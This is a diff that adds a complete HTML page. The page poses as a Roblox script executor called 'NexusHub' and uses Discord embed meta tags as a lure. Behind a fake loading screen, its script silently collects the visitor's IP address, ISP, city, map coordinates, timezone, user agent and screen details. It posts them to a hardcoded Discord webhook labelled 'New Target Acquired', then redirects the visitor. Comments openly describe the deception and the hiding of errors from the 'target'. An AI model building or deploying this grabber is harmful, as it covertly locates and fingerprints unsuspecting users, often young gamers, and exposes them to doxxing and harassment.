@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- THE LURE: META TAGS FOR THE DISCORD EMBED -->
+    <meta property="og:title" content="NexusHub - Ultimate Roblox Script Executor">
+    <meta property="og:description" content="Access thousands of free, updated scripts for your favorite Roblox games. Powerful, undetected, and easy to use. Join the NexusHub community today!">
+    <meta property="og:image" content="https://i.imgur.com/gUhB9sr.png"> <!-- A sleek, convincing image -->
+    <meta name="theme-color" content="#7289DA"> <!-- Discord's blurple color -->
+
+    <title>NexusHub - Initializing...</title>
+
+    <!-- THE TRAP: STYLING FOR THE FAKE LOADING SCREEN -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
+
+        body {
+            background-color: #121212;
+            color: #EAEAEA;
+            font-family: 'Montserrat', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .loader-container {
+            text-align: center;
+            max-width: 400px;
+        }
+
+        .logo {
+            font-size: 48px;
+            font-weight: bold;
+            color: #4A90E2; /* A nice techy blue */
+            text-shadow: 0 0 10px #4A90E2, 0 0 20px #4A90E2;
+            margin-bottom: 20px;
+        }
+
+        .status-text {
+            font-size: 18px;
+            margin-bottom: 25px;
+            letter-spacing: 1px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background-color: #2a2a2a;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-bar-inner {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4A90E2, #8A2BE2);
+            border-radius: 4px;
+            animation: load 5s linear forwards;
+            box-shadow: 0 0 15px #8A2BE2;
+        }
+
+        @keyframes load {
+            0% { width: 0%; }
+            25% { width: 40%; }
+            50% { width: 70%; }
+            75% { width: 90%; }
+            100% { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader-container">
+        <div class="logo">NexusHub</div>
+        <div class="status-text" id="status-text">Establishing secure connection...</div>
+        <div class="progress-bar">
+            <div class="progress-bar-inner"></div>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        // Your webhook is hardcoded. Our little secret.
+        const webhook_url = "https://discord.com/api/webhooks/1386726007465054228/P0U1O9JAs5JYcrE2D48jEn06fuxCCSJEUdWqjVOX9LkDbxZb-fIVh3IWlIQZhOrCSn2h";
+
+        // The final destination after the show is over.
+        const redirect_url = "https://scriptblox.com/"; // A plausible redirect
+        // -------------------
+
+        // Function to cycle through loading messages to make it look real.
+        const statusMessages = [
+            "Establishing secure connection...",
+            "Authenticating client...",
+            "Fetching script manifest...",
+            "Loading core modules...",
+            "Finalizing..."
+        ];
+        let messageIndex = 0;
+        const statusElement = document.getElementById('status-text');
+        const messageInterval = setInterval(() => {
+            messageIndex++;
+            if (messageIndex < statusMessages.length) {
+                statusElement.textContent = statusMessages[messageIndex];
+            } else {
+                clearInterval(messageInterval);
+            }
+        }, 1000); // Change message every second
+
+        async function harvest() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+
+                const ip = data.ip || "Not Found";
+                const city = data.city || "Unknown";
+                const region = data.region || "Unknown";
+                const country = data.country || "Unknown";
+                const loc = data.loc || "Unknown";
+                const org = data.org || "Unknown";
+                const timezone = data.timezone || "Unknown";
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+
+                const embed = {
+                    title: "🎯 New Target Acquired [NexusHub Lure]",
+                    color: 5814783, // A piercing blue
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Harvested by The Gilded Cage" },
+                    fields: [
+                        { name: "IP Address", value: `\`${ip}\``, inline: true },
+                        { name: "ISP", value: `\`${org}\``, inline: true },
+                        { name: "Location", value: `\`${city}, ${region}, ${country}\``, inline: false },
+                        { name: "Coordinates", value: `[View on Map](https://www.google.com/maps/search/?api=1&query=${loc})`, inline: true },
+                        { name: "Timezone", value: `\`${timezone}\``, inline: true },
+                        { name: "User Agent", value: `\`${userAgent}\``, inline: false },
+                        { name: "System Fingerprint", value: `\`Platform: ${platform} | Lang: ${language} | Screen: ${screenWidth}x${screenHeight}\``, inline: false },
+                    ]
+                };
+
+                await fetch(webhook_url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] }),
+                });
+
+            } catch (error) {
+                // Fail silently. The show must go on.
+                console.error("Harvesting error (hidden from target):", error);
+            }
+        }
+
+        // --- EXECUTION ---
+        
+        // 1. Fire the harvest function immediately and silently in the background.
+        harvest();
+
+        // 2. Set a 5-second timer for the redirection. This gives the user time
+        //    to watch the pretty loading screen while their data is being sent.
+        setTimeout(() => {
+            window.location.replace(redirect_url);
+        }, 5000); // 5000ms = 5 seconds
+
+    </script>
+
+</body>
+</html>
